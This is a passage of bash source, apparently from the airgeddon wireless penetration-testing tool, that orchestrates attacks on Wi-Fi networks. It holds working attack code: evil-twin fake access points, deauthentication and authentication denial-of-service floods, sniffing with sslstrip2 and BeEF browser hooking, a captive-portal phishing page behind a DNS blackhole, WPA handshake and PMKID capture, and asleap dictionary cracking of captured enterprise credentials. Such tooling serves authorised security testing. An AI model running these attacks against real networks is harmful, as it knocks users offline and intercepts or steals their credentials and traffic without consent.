					current_iface_on_messages="${tmp_current_iface_on_messages}"
				fi

				local tmp_ifacemode
				tmp_ifacemode=$(grep -E "^ifacemode=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_ifacemode}" ]; then
					ifacemode="${tmp_ifacemode}"
				fi

				rm -rf "${tmpdir}${enterprisedir}returning_vars.txt" > /dev/null 2>&1
			fi
		else
			restore_et_interface
		fi
	fi
	handle_enterprise_log
	handle_asleap_attack
	clean_tmpfiles
}
function handle_asleap_attack() {

	debug_print

	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
		local result
		result=$(cat "${tmpdir}${enterprisedir}${enterprise_successfile}")
		if [[ "${result}" -eq 0 ]] || [[ "${result}" -eq 2 ]]; then
			ask_yesno 537 "no"
			if [ "${yesno}" = "y" ]; then

				asleap_attack_finished=0

				if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
					for item in "${!enterprise_captured_challenges_responses[@]}"; do
						enterprise_username="${item}"
					done

					echo
					language_strings "${language}" 542 "yellow"
				else
					select_captured_enterprise_user
				fi

				echo
				language_strings "${language}" 538 "blue"

				while [[ "${asleap_attack_finished}" != "1" ]]; do
					ask_dictionary
					echo
					exec_asleap_attack
					echo
					manage_asleap_pot
				done
			fi
		fi
	fi
}
function select_captured_enterprise_user() {

	debug_print

	echo
	language_strings "${language}" 47 "green"
	print_simple_separator

	local counter=0
	local space="  "
	declare -A temp_array_enterpise_users
	for item in "${!enterprise_captured_challenges_responses[@]}"; do
		if [ "${counter}" -gt 9 ]; then
			space=" "
		fi
		counter=$((counter + 1))
		echo "${counter}.${space}${item}"
		temp_array_enterpise_users[${counter}]="${item}"
	done
	print_simple_separator

	option_enterprise_user_selected=""
	while [[ -z "${option_enterprise_user_selected}" ]]; do
		read -rp "> " option_enterprise_user_selected
		if [[ ! "${option_enterprise_user_selected}" =~ ^[0-9]+$ ]] || [[ "${option_enterprise_user_selected}" -lt 1 ]] || [[ "${option_enterprise_user_selected}" -gt ${counter} ]]; then
			option_enterprise_user_selected=""
			echo
			language_strings "${language}" 543 "red"
		fi
	done

	enterprise_username="${temp_array_enterpise_users[${option_enterprise_user_selected}]}"
}
function exec_asleap_attack() {

	debug_print

	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1

	if [ "${1}" != "offline_menu" ]; then
		[[ "${enterprise_captured_challenges_responses[${enterprise_username}]}" =~ (([0-9a-zA-Z]{2}:?)+)[[:blank:]]/[[:blank:]](.*) ]] && enterprise_asleap_challenge="${BASH_REMATCH[1]}" && enterprise_asleap_response="${BASH_REMATCH[3]}"
	fi
	asleap_cmd="asleap -C \"${enterprise_asleap_challenge}\" -R \"${enterprise_asleap_response}\" -W \"${DICTIONARY}\" -v | tee \"${tmpdir}${asleap_pot_tmp}\" ${colorize}"
	eval "${asleap_cmd}"
}
function exec_et_onlyap_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	clean_tmpfiles
}
function exec_et_sniffing_attack() {

	debug_print

	# 타겟 ap 설정 복사
	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_ettercap_sniffing
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	if [ "${ettercap_log}" -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles
}
function exec_et_sniffing_sslstrip2_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_bettercap_sniffing
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	if [ "${bettercap_log}" -eq 1 ]; then
		parse_bettercap_log
	fi
	clean_tmpfiles
}
function exec_et_sniffing_sslstrip2_beef_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	if [ "${beef_found}" -eq 1 ]; then
		get_beef_version
		set_beef_config
	else
		new_beef_pass="beef"
		et_misc_texts[${language},27]=${et_misc_texts[${language},27]/${beef_pass}/${new_beef_pass}}
		beef_pass="${new_beef_pass}"
	fi
	launch_beef
	launch_bettercap_sniffing
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	if [ "${bettercap_log}" -eq 1 ]; then
		parse_bettercap_log
	fi
	clean_tmpfiles
}
function exec_et_captive_portal_attack() {

	debug_print

	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window
	launch_dns_blackhole
	set_webserver_config
	set_captive_portal_page
	launch_webserver
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	clean_tmpfiles
}
function exec_et_deauth() {

	debug_print

	prepare_et_monitor

	case ${et_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
		;;
		"Aireplay")
			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
		;;
		"Auth DoS")
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
		;;
	esac

	recalculate_windows_sizes
	if [ -n "${enterprise_mode}" ]; then
		deauth_scr_window_position=${g1_bottomleft_window}
	else
		case ${et_mode} in
			"et_onlyap")
				deauth_scr_window_position=${g1_bottomright_window}
			;;
			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
				deauth_scr_window_position=${g3_bottomleft_window}
			;;
			"et_sniffing_sslstrip2")
				deauth_scr_window_position=${g4_bottomleft_window}
			;;
		esac
	fi

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
		pid_control_pursuit_mode "${et_dos_attack}" &
	else
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
			et_processes+=($!)
		else
			get_tmux_process_id "${deauth_et_cmd}"
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi

		sleep 1
	fi
}
function exec_wpa3_downgrade_deauth() {

	debug_print

	prepare_wpa3_downgrade_monitor

	case ${downgrade_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			deauth_downgrade_cmd="${mdk_command} ${iface_monitor_downgrade_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
		;;
		"Aireplay")
			deauth_downgrade_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_downgrade_deauth}"
		;;
		"Auth DoS")
			deauth_downgrade_cmd="${mdk_command} ${iface_monitor_downgrade_deauth} a -a ${bssid} -m"
		;;
	esac

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"Deauth\"" "${deauth_downgrade_cmd}" "Deauth"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		downgrade_dos_pid=$!
	else
		get_tmux_process_id "${deauth_downgrade_cmd}"
		downgrade_dos_pid="${global_process_pid}"
		global_process_pid=""
	fi

	sleep 1
}
function exec_clean_handshake_file() {

	debug_print

	echo
	if ! check_valid_file_to_clean "${filetoclean}"; then
		language_strings "${language}" 159 "yellow"
	else
		wpaclean "${filetoclean}" "${filetoclean}" > /dev/null 2>&1
		language_strings "${language}" 153 "yellow"
	fi
	language_strings "${language}" 115 "read"
}
function capture_handshake_evil_twin() {

	debug_print

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	ask_timeout "capture_handshake_decloak"
	capture_handshake_window

	case ${et_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=12
		;;
		"Aireplay")
			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=12
		;;
		"Auth DoS")
			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
				processidattack="${global_process_pid}"
				global_process_pid=""
			fi
			sleeptimeattack=16
		;;
	esac

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
	else
		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Capturing Handshake" &> /dev/null
	fi

	handshake_capture_check

	check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"
	case "$?" in
		"0")
			handshakepath="${default_save_path}"
			handshakefilename="handshake-${bssid}.cap"
			handshakepath="${handshakepath}${handshakefilename}"

			echo
			language_strings "${language}" 162 "yellow"
			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "writeethandshake"
			done

			cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
			echo
			language_strings "${language}" 324 "blue"
			language_strings "${language}" 115 "read"
			return 0
		;;
		"1")
			echo
			language_strings "${language}" 146 "red"
			language_strings "${language}" 115 "read"
			return 2
		;;
		"2")
			return 2
		;;
	esac
}
function exec_decloak_by_dictionary() {

	debug_print

	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1

	local unbuffer
	unbuffer=""
	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		unbuffer="stdbuf -i0 -o0 -e0 "
	fi

	rm -rf "${tmpdir}decloak.log" > /dev/null 2>&1
	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g1_topright_window} -T \"decloak by dictionary\"" "${unbuffer}${mdk_command} ${interface} p -t ${bssid} -f ${DICTIONARY} | tee ${tmpdir}decloak.log ${colorize}" "decloak by dictionary" "active"
	wait_for_process "${mdk_command} ${interface} p -t ${bssid} -f ${DICTIONARY}" "decloak by dictionary"

	if check_essid_in_mdk_decloak_log; then
		echo
		language_strings "${language}" 162 "yellow"
		echo
		language_strings "${language}" 736 "blue"
		language_strings "${language}" 115 "read"
	else
		echo
		language_strings "${language}" 738 "red"
		language_strings "${language}" 115 "read"
	fi
}
function capture_pmkid_handshake() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [ "${channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	if ! validate_network_type "personal"; then
		return 1
	fi

	echo
	language_strings "${language}" 126 "yellow"
	language_strings "${language}" 115 "read"

	if [ "${1}" = "handshake" ]; then
		dos_handshake_decloaking_menu "${1}"
	else
		launch_pmkid_capture
	fi
}
